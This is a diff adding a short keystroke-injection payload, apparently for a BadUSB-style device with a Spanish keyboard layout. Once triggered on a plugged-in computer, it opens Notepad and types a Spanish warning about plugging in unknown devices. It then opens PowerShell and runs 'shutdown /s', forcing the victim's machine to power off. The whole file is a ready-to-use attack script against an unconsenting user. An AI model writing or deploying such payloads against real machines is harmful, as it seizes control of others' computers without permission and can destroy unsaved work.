@@ -1,0 +1,17 @@
+layout ("es");
+waitLEDRepeat (ANY,3,1000000);
+press ("GUI r");
+delay(100);
+type("Notepad\n");
+delay(500);
+type("Su equipo ha sido expuesto, debería tener cuidado con que enchufa en el...");
+delay(10000);
+//press("Ctrl w");
+delay(100);
+press("Enter");
+delay (500);
+press("GUI r");
+delay (100);
+type ("powershell\n");
+delay (200);
+type ("shutdown /s \n");
